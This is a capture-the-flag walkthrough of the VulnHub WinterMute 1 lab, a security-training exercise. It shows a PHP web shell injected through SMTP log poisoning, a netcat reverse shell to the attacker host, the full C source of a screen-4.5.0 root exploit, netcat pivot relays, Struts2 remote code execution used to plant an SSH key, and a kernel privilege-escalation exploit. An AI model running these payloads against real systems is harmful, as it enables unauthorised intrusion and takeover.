---
title: VulnHub - WinterMute 1
author: ret2x
date: 2021-12-26 21:22:46 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, lfi, tomcat, rce]
image:
    path: /assets/images/wintermute/front.png
---

**Description:** In this case it involves two vulnerable machines, the first requires to enumerate in different ways and thus exploiting through a SMTP Log Poisoning to get the first foothold, to get root privileges was taken advantaje of misconfigurations and outdated software. The second machine pretends to be located on another network interface that only has connectivity with the first compromised host, in this situation various enumeration techniques were applied including port forwarding and thus it was possible to identify and exploit a Remote Code Execution, to get root privileges was through a kernel exploit.

**Author:** creosote

**Operating System:** Linux

**Download:** [https://www.vulnhub.com/entry/wintermute-1,239/](https://www.vulnhub.com/entry/wintermute-1,239/)

## Information Gathering
### Host Discovery

A ping scan detected the target host on the local network, the script used can be found [here](https://github.com/ret2x-tools/ping-scan.git).

```console
root@kali:~$ ping-scan.py -r 192.168.179.0/24
192.168.179.180 is up
```

### Port Scanning

The full TCP port scan with nmap detected three available ports.

```console
root@kali:~$ nmap -T4 -v -n -p1-65535 192.168.179.180 -oA nmap/all-tcp-ports
...
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
```

### Service Enumeration

In order to get more information about the target an aggressive scan was performed on open ports.

```console
root@kali:~$ nmap -A -n -v -p25,80,3000 192.168.179.180 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE         VERSION                                                                                                                              
25/tcp   open  smtp            Postfix smtpd                                                                                                                        
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,                                         
80/tcp   open  http            Apache httpd 2.4.25 ((Debian))                                                                                                       
| http-methods:                                                                                                                                                     
|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                        
|_http-server-header: Apache/2.4.25 (Debian)                                                                                                                        
|_http-title: Night City                                                                                                                                            
3000/tcp open  hadoop-datanode Apache Hadoop                                                                                                                        
| hadoop-datanode-info: 
|_  Logs: submit
| hadoop-tasktracker-info: 
|_  Logs: submit
|_http-favicon: Unknown favicon MD5: 7FC0953320A93F3BC71770C25A7F4716
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```


### Web Enumeration 
**Enumeration on port 80**

On the home page there is not much to see, so to find some hidden web content I ran gobuster.

![](/assets/images/wintermute/screenshot-1.png)

```console
root@kali:~$ gobuster dir -u http://192.168.179.180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x html,php,txt
...
http://192.168.179.180/index.html           (Status: 200) [Size: 326]
http://192.168.179.180/manual               (Status: 301) [Size: 319] [--> http://192.168.179.180/manual/]
http://192.168.179.180/freeside             (Status: 301) [Size: 321] [--> http://192.168.179.180/freeside/]
http://192.168.179.180/server-status        (Status: 403) [Size: 303]
```

In the **freeside** directory there is a page with an image, nothing was found when listing in this directory.

![](/assets/images/wintermute/screenshot-2.png)


**Enumeration on port 3000**

On port 3000 there is an ntopng web form, we log in with admin as username and password.

![](/assets/images/wintermute/screenshot-3.png)

![](/assets/images/wintermute/screenshot-4.png)

Browsing the web page clicking on the **Flows** tab I found a table that contains two directories, the one we know is **/freeside/**, and the other is **/turing-bolo/**, as we can see these are running on port 80.

![](/assets/images/wintermute/screenshot-5.png)

We access the **/turing-bolo** directory on port 80 and it greets us with a web page, then we look for the user **Case** to see the activity log.

![](/assets/images/wintermute/screenshot-6.png)

We can see a message for the user **Case**, and the other available members.

![](/assets/images/wintermute/screenshot-7.png)

This page is including files with **.log** extension, through the **bolo** parameter we include the **/var/log/mail.log** file without the extension, and we can see the logs from SMTP service.

![](/assets/images/wintermute/screenshot-8.png)

We can inject php code into the SMTP log file, we insert the **phpinfo()** function to connect to the SMTP service on port 25. 

```console
root@kali:~$ nc -v 192.168.179.180 25
straylight [192.168.179.180] 25 (smtp) open
220 straylight ESMTP Postfix (Debian/GNU)
VRFY <?php phpinfo(); ?>
501 5.1.3 Bad recipient address syntax
```

We loaded the web page, and we can see that the php code is executing.

![](/assets/images/wintermute/screenshot-9.png)

## Exploitation 
### SMTP Log Poisoning

Using the above procedure we inject a web shell

```console
root@kali:~$ nc -v 192.168.179.180 25
straylight [192.168.179.180] 25 (smtp) open
220 straylight ESMTP Postfix (Debian/GNU)
VRFY <?php echo shell_exec($_REQUEST['cmd']); ?>
501 5.1.3 Bad recipient address syntax
```

We check that the **id** command is being executed correctly.

```console
root@kali:~$ curl -s -X POST "http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail" --data "cmd=id" | grep 'Illegal' | tail -n +2 | awk -F ":" '{print $NF}'
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We check that netcat is installed on the target.

```console
root@kali:~$ curl -s -X POST "http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail" --data "cmd=whereis nc" | grep 'Illegal' | tail -n +2 | awk -F ":" '{print $NF}'
 /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
```

We start a netcat listener on port 433, and execute the following curl request.

```console
root@kali:~$ curl -s -X POST "http://192.168.179.180/turing-bolo/bolo.php?bolo=/var/log/mail" --data "cmd=nc 192.168.179.1 443 -e /bin/bash"
```

We have a shell with privileges of user www-data.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.180] 38922
python -c "import pty; pty.spawn('/bin/bash')"
www-data@straylight:/var/www/html/turing-bolo$ 
```

When listing the SUID binaries, screen-4.5.0 was detected, this is a vulnerable version that allows privilege escalation.

```console
www-data@straylight:/home/turing-police$ find / -perm -u=s -type f 2>/dev/null
<uring-police$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
www-data@straylight:/home/turing-police$
```

## Privilege Escalation
### Exploiting Screen 4.5.0 

The vulnerability consists in that the check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root access in several ways.


We download the exploit.

```console
root@kali:~$ wget https://www.exploit-db.com/download/41154 -O exploit.sh
```

I broke down the exploit, so it was not possible to run it directly.

libhax.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

rootshell.c

```c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

We verify that gcc is installed on the target.

```console
www-data@straylight:/var/www/html/turing-bolo$ which gcc
which gcc
/usr/bin/gcc
www-data@straylight:/var/www/html/turing-bolo$
```

We start a python web server on port 80.

```console
root@kali:~$ python3 -m http.server 80
```

Then, we transfer the c lenguage files to the victim machine.

```console
www-data@straylight:/tmp$ wget 192.168.179.1/{libhax.c,rootshell.c}
```

We compile them.

```console
www-data@straylight:/tmp$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c 
www-data@straylight:/tmp$ gcc -o /tmp/rootshell /tmp/rootshell.c
```

We execute the following commands and we get root.

```console
www-data@straylight:/etc$ cd /etc
cd /etc
www-data@straylight:/etc$ umask 000
umask 000
www-data@straylight:/etc$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
< -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
www-data@straylight:/etc$ /bin/screen-4.5.0 -ls
/bin/screen-4.5.0 -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@straylight:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

We read the flag.

```console
# python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"
python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"
root@straylight:/etc# cd /root
cd /root
root@straylight:/root# ls
ls
flag.txt  note.txt  scripts
root@straylight:/root# cat flag.txt
cat flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
```

We found a note containing a message about a Tomcat web service and a directory.

```console
root@straylight:/root# cat note*
cat note*
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
```

We list the network interfaces.

```console
root@straylight:/root/scripts# ifconfig
ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.179.181  netmask 255.255.255.0  broadcast 192.168.179.255
        inet6 fe80::a00:27ff:fe83:6d5c  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:83:6d:5c  txqueuelen 1000  (Ethernet)
        RX packets 2271  bytes 231817 (226.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2981  bytes 276415 (269.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fe92:ffec  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:92:ff:ec  txqueuelen 1000  (Ethernet)
        RX packets 24  bytes 6942 (6.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 3762 (3.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 19907  bytes 2079525 (1.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19907  bytes 2079525 (1.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Information Gathering
### Host Discovery

We discovered our next target **192.168.56.104** on another network with the following bash oneliner.

```console
root@straylight:/tmp# for n in $(seq 1 255); do ping -c 1 192.168.56.$n >&/dev/null && echo "[+] Host 192.168.56.$n up"; done
</dev/null && echo "[+] Host 192.168.56.$n up"; done
[+] Host 192.168.56.1 up
[+] Host 192.168.56.100 up
[+] Host 192.168.56.104 up
[+] Host 192.168.56.105 up
root@straylight:/root#
```

### Port Scanning

I developed a python port scanner to discover open ports.

```python
#!/usr/bin/env python3 

import socket

host = "192.168.56.104"

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(3)
        return True
    except:
        pass

for p in range(1, 65535):
    if scan(p):
        print("[+] Port {} open".format(p))
```

We start a web server with python on port 80.

```console
root@kali:~$ python3 -m http.server 80
```

On target machine we download the port scanner, give it execution permissions and execute it.

```console
root@straylight:/root# wget 192.168.179.1/pscan.py

root@straylight:/root# chmod +x pscan.py
chmod +x pscan.py
root@straylight:/root# ./pscan.py
./pscan.py
[+] Port 8009 open
[+] Port 8080 open
[+] Port 34483 open
root@straylight:/root#
```

### Service Enumeration

We check the banner on port 8009 with telnet but the service was not detected.

```console
root@straylight:/root# telnet 192.168.56.104 8009
telnet 192.168.56.104 8009
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is '^]'.

Connection closed by foreign host.
root@straylight:/root#
```

The banner reveals that a web server is running on port 8080.

```console
root@straylight:/root# telnet 192.168.56.104 8080
telnet 192.168.56.104 8080
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is '^]'.
HEAD / HTTP/1.0

HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Date: Wed, 26 Jan 2022 01:32:08 GMT
Connection: close

Connection closed by foreign host.
root@straylight:/root# 
```

And on port 34483 we see that SSH is running.

```console
root@straylight:/root# telnet 192.168.56.104 34483
telnet 192.168.56.104 34483
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4


Protocol mismatch.
Connection closed by foreign host.
root@straylight:/root#
```

### Web Enumeration on port 8080

To set up a netcat relay for pivoting we execute the following commands.

```console
root@straylight:/root# mknod /tmp/backpipe p 
root@straylight:/root# nc -lp 8080 < /tmp/backpipe | nc 192.168.56.104 8080 > /tmp/backpipe
```

This establishes a netcat listener on port 8080, the netcat listener pipes any traffic it receives to the netcat client which forwards the traffic to port 8080 on the target web server 192.168.56.104.


Now on the attacking machine we can browse the tomcat web page.

![](/assets/images/wintermute/screenshot-10.png)

If we remember the directory into the note, so we browse on it.

http://192.168.56.104:8080/struts2_2.3.15.1-showcase

![](/assets/images/wintermute/screenshot-11.png)

Struts version 2.3.15 is vulnerable to Remote Code Execution

```console
root@kali:~$ searchsploit struts 2.3.15
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution                                        | multiple/remote/44556.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (1)                                         | linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 / 2.5 < 2.5.16 - Remote Code Execution (2)                                         | multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - 'Jakarta' Multipart Parser OGNL Injection (Metasploit)          | multiple/remote/41614.rb
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution                                           | linux/webapps/41570.py
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code Execution (Metasploit)             | multiple/remote/41690.rb
Apache Struts2 2.0.0 < 2.3.15 - Prefixed Parameters OGNL Injection                                            | multiple/webapps/44583.txt
-------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We copy the exploit to our current directory.

```console
root@kali:~$ searchsploit -m linux/webapps/41570.py
```

## Exploitation
### Remote Code Execution 

Apache Struts 2 versions 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 remote code execution exploit that provides a reverse shell.

We run the script adding as parameter the URL and the id command.

```console
root@kali:~$ python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action id
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: id

uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

The command was successfully executed, we can try to get a reverse shell, but I prefer to access via SSH.

```console
root@kali:~$ python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action "mkdir /home/ta/.ssh"
```

We generate the SSH key pair.

```console
root@kali:~$ ssh-keygen -P "ta123" -f id_rsa
```

We create the authorized_keys file with the the public key inside the ssh directory in the ta's home directory.

```console
root@kali:~$ python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXzybvylP8i
qZivblk2Ezss0lYM4TsTMscRB1Hy9cy2r6Z4lXUv1Z5Y2cEuha/9YQ6O1w51f3iCBtWQUi+feKvlqhL6q8FEsF3ju4cdiD87rMPOHia1M4MYJoU4CEcN8Y8u1IN35Uvn+NBz+rad2ESwlbvsa3dBotTHWGvLR140HE1k
qzrejm2z42DSE356qkY2I4+2xLoHtfQiIAVPl5p9YGcjwDs4NWeYFRZ8RbMYnW7pVD6Bj+hQedOn9uPM+wm1dUh+ZiEwgGFSeeKWvfR7N0LQ69+YhK0gAPY//6NiK300UFpGWW6D+RNyAq9+3zovqini3XPfnfLrhHtG
vMbuN4Yzp9+g8N7Pz8nWXBLo/V3Yufxw99j7y3Rwj4LUVrGqWi7HUkQFSK/kIzUU81wJ54x+JrtToBuXIFl57fXz23NfBLsJMIIjYykTmbUGaTDWpmm2fRoCMdGQmr3EASDpvzuZSNsvVr5wqCSQ0CrJ3+NM3sKEqwZR
ItFaad4mhE= > /home/ta/.ssh/authorized_keys"
```

We grant read and write permissions to the owner of the authorized_keys file.

```console
root@kali:~$ python 41570.py http://192.168.56.104:8080/struts2_2.3.15.1-showcase/showcase.action "chmod 600 /home/ta/.ssh/authorized_keys"
```

We execute the following commands to set up a netcat relay to pivot as shown previously.

```console
root@straylight:/root# mknod /tmp/backpipe2 p
root@straylight:/root# nc -lp 34483 < /tmp/backpipe2 | nc 192.168.56.104 34483 > /tmp/backpipe2
```

We access via SSH as user ta.

```console
root@kali:~$ ssh -l ta 192.168.56.104 -p 34483 -i id_rsa
The authenticity of host '[192.168.56.104]:34483 ([192.168.56.104]:34483)' can't be established.
ECDSA key fingerprint is SHA256:oUL2wjfAFRqayjqOgc79xVYeSqvD92zqaV+4udNxJrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.56.104]:34483' (ECDSA) to the list of known hosts.
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

94 packages can be updated.
44 updates are security updates.


Last login: Tue Jul  3 21:53:25 2018
ta@neuromancer:~$
```

We execute the find command to locate the tomcat-users.xml file.

```console
ta@neuromancer:/$ find / -name 'tomcat-users.xml' 2>/dev/null | xargs cat
...
<user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>
...
```

As we can see, Lady3Jane's password is encoded in HTML, we decode to plain text using the hURL utility.

```console
root@kali:~$ hURL -h "&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"

Original     :: &gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;
HTML DEcoded :: >!Xx3JanexX!<
```

## Privilege Escalation
### Password Disclosure

We change to the user lady3jane.

```console
ta@neuromancer:/$ su - lady3jane
Password: 
lady3jane@neuromancer:~$ ls
custom-tomcat-chk.sh
```

We see a bash script in the home directory, I thought this script was being executed by a cron job, a way to escalate privileges, but it was not possible.

```console
lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh 
#!/bin/bash
# Health check for Neuromancer (root) to execute every 3 minutes.
# ..the AI tells me it can maintain security, server health, etc w/o forced intervention,
# but I beg to differ...hence the cron script.

> /tmp/tomcat_status.log

health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)

case "$health" in

  *200*)
        echo "Tomcat is Up" > /tmp/tomcat_status.log
        ;;
  *)
        echo "Tomcat is down" > /tmp/tomcat_status.log
        ;;
  esac

lady3jane@neuromancer:~$
```

### Kernel Exploit

Another way is to find a kernel exploit.

```console
ta@neuromancer:~$ id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

ta@neuromancer:~$ uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

A possible kernel exploit for this version in the following.

```console
root@kali:~$ searchsploit 4.4.0
------------------------------------------------------------------------------- --------------------------------
 Exploit Title                                                                 |  Path                         
------------------------------------------------------------------------------- --------------------------------
...
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation         | linux/local/44298.c
...
------------------------------------------------------------------------------- --------------------------------
```

We copy the exploit to our current directory.

```console
root@kali:~$ searchsploit -m linux/local/44298.c
```

We compile the exploit on the attacking machine since gcc is not installed on the victim machine.

```console
root@kali:~$ gcc 44298.c -o exp
```

We transfer the exploit to the victim machine via SSH.

```console
root@kali:~$ scp -i id_rsa -P 34483 exp ta@192.168.56.104:exp  
 ----------------------------------------------------------------
|                Neuromancer Secure Remote Access                |
| UNAUTHORIZED ACCESS will be investigated by the Turing Police  |
 ----------------------------------------------------------------
Enter passphrase for key 'id_rsa': 
exp
```

We grant execution privileges to the compiled exploit, execute it, and we get root.

```console
ta@neuromancer:~$ chmod 755 exp 
ta@neuromancer:~$ ./exp 
task_struct = ffff88000af43800
uidptr = ffff88000c915484
spawning root shell
root@neuromancer:~# cd /root/
root@neuromancer:/root# ls
flag.txt  struts2  velocity.log
root@neuromancer:/root# cat flag.txt 
be3306f431dae5ebc93eebb291f4914a
root@neuromancer:/root#
```
